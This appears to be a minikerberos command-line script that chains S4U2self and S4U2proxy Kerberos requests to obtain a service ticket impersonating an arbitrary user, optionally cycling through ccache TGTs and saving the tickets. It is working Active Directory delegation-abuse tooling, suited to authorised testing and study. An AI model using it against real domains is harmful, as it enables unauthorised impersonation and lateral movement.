import logging
import asyncio

from minikerberos import logger
from minikerberos.common.factory import KerberosClientFactory, kerberos_url_help_epilog
from minikerberos.common.constants import KerberosSecretType
from minikerberos.common.spn import KerberosSPN
from minikerberos.common.creds import KerberosCredential
from minikerberos.common.kirbi import Kirbi


async def s4u2proxy_chain(client, target_user, service_spn, selfkirbifile = None):
	"""
	Performs the full S4U2self + S4U2proxy (RBCD / constrained delegation) chain:
	1. S4U2self  - service ticket for target_user to the account itself
	2. S4U2proxy - service ticket for target_user to service_spn, using the
	               S4U2self ticket as additional-ticket
	Returns the final (tgs, encTGSRepPart, key) tuple.
	"""
	logger.info('[S4U2self] Requesting ticket for %s to self' % target_user.get_formatted_pname())
	s4u_tgs, s4u_encTGSRepPart, _ = await client.S4U2self(target_user)
	if selfkirbifile is not None:
		s4u_kirbi = Kirbi.from_ticketdata(s4u_tgs, s4u_encTGSRepPart)
		s4u_kirbi.to_file(selfkirbifile)
		logger.info('[S4U2self] Ticket stored in %s' % selfkirbifile)

	logger.info('[S4U2proxy] Requesting ticket for %s to %s' % (target_user.get_formatted_pname(), service_spn.get_formatted_pname()))
	return await client.S4U2proxy(s4u_tgs['ticket'], service_spn)


async def getS4U2proxy(kerberos_url, spn, targetuser, kirbifile = None, ccachefile = None, selfkirbifile = None):
	cu = KerberosClientFactory.from_url(kerberos_url)
	client = cu.get_client()
	service_spn = KerberosSPN.from_spn(spn)
	target_user = KerberosSPN.from_upn(targetuser)
	
	if cu.secret_type != KerberosSecretType.CCACHE:
		logger.debug('Getting TGT')
		await client.get_TGT()
		tgs, encTGSRepPart, key = await s4u2proxy_chain(client, target_user, service_spn, selfkirbifile)
	else:
		logger.debug('Getting TGS via TGT from CCACHE')
		for kirbi in client.credential.ccache.get_all_tgt_kirbis():
			try:
				logger.info('Trying to get SPN with %s' % kirbi.get_username())
				ccred_test = KerberosCredential.from_kirbi(kirbi.to_hex(), encoding='hex')
				client = cu.get_client_newcred(ccred_test)
				tgs, encTGSRepPart, key = await s4u2proxy_chain(client, target_user, service_spn, selfkirbifile)
				logger.info('Sucsess!')
				break
			except Exception as e:

				logger.debug('This ticket is not usable it seems Reason: %s' % e)
				continue
	
	if ccachefile is not None:
		client.ccache.to_file(ccachefile)
		print('Ticket stored in ccache file %s' % ccachefile)
	
	kirbi = Kirbi.from_ticketdata(tgs, encTGSRepPart)
	print(str(kirbi))
	if kirbifile is not None:
		kirbi.to_file(kirbifile)
		
	logging.info('Done!')
def main():
	import argparse
	
	parser = argparse.ArgumentParser(description='Gets an S4U2proxy ticket impersonating given user', formatter_class=argparse.RawDescriptionHelpFormatter, epilog = kerberos_url_help_epilog)
	parser.add_argument('--kirbi', help='kirbi file to store the TGS ticket in, otherwise kirbi will be printed to stdout')
	parser.add_argument('--ccache', help='ccache file to store the TGT ticket in')
	parser.add_argument('--selfkirbi', help='kirbi file to store the intermediate S4U2self ticket in')
	parser.add_argument('-v', '--verbose', action='count', default=0)
	parser.add_argument('kerberos_url', help='Machine account credentials in kerberos URL format.')
	parser.add_argument('spn', help='the service principal in format <service>/<server-hostname>@<domain> Example: cifs/fileserver.test.corp@TEST.corp for a TGS ticket to be used for file access on server "fileserver". IMPORTANT: SERVER\'S HOSTNAME MUST BE USED, NOT IP!!!')
	parser.add_argument('targetuser', help='')
	
	args = parser.parse_args()
	if args.verbose == 0:
		logger.setLevel(logging.WARNING)
	elif args.verbose == 1:
		logger.setLevel(logging.INFO)
	else:
		logger.setLevel(1)

	asyncio.run(getS4U2proxy(args.kerberos_url, args.spn, args.targetuser, args.kirbi, args.ccache, args.selfkirbi))
	
	
if __name__ == '__main__':
	main()
